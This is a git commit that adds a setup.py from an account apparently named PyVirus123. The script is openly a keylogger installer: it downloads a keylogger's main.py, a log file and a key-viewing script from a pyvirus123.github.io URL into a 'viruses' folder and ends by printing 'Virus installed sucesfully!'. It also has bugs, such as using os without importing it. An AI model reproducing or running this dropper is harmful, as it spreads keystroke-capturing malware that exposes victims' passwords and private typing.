8d64159f1adce66053d0d23997d58f1d9e4c81ec
PyVirus123 <168095928+PyVirus123@users.noreply.github.com>
2024-04-26 17:37:10 +0300

    Create setup.py

---
+++ viruses/preset/keylogger/setup.py
@@ -0,0 +1,42 @@
+print("loading modules...")
+print("import requests")
+try:
+    import requests
+except ModuleNotFoundError:
+    print("ERROR: module not found. please install the module requests to continue.")
+print("modules loaded")
+print("loading classes...")
+print("class CustomError()")
+class CustomError(Exception):
+    def __init__(self, message):
+        self.message = message
+print("classes loaded")
+print("loading functions...")
+print("def download_file()")
+def download_file(url, save_path):
+    print("Downloading " + save_path)
+    # Send an HTTP GET request to the URL
+    response = requests.get(url)
+    
+    # Check if the request was successful (status code 200)
+    if response.status_code == 200:
+        # Open a file in binary write mode and write the response content to it
+        with open(save_path, 'wb') as file:
+            file.write(response.content)
+        print("Downloaded " + save_path)
+    else:
+        print(f"Failed to download " + save_path + ". Status code: {response.status_code}")
+        raise CustomError("Could not download file " + save_path)
+print("functions loaded")
+print("creating directory")
+if not os.path.isdir("viruses/preset/keylogger"):
+ os.mkdir("viruses/preset/keylogger")
+print("directories created")
+print("downloading files")
+try:
+ download_file("https://pyvirus123.github.io/PyVirus/viruses/preset/keylogger/main.py", "viruses/preset/keylogger/main.py")
+ download_file("https://pyvirus123.github.io/PyVirus/viruses/preset/keylogger/keys.log", "viruses/preset/keylogger/keys.log")
+ download_file("https://pyvirus123.github.io/PyVirus/viruses/preset/keylogger/showkeys.py", "viruses/preset/keylogger/showkeys.py")
+except:
+ print("Failed to download files.")
+print("Virus installed sucesfully!")
